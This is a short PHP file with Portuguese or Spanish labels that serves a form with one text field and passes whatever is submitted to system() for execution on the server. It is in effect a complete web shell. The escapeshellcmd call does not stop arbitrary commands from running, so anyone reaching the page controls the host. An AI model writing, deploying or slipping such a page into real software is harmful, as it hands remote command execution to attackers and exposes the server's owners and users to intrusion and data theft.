<?php

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $cmd = escapeshellcmd($_POST["cmd"]);
    var_dump($cmd);
    $comando = system($cmd, $retorno);
}

?>

<form method="post">

<input type="text" name="cmd">
<input type="submit" value="Enviar">

</form>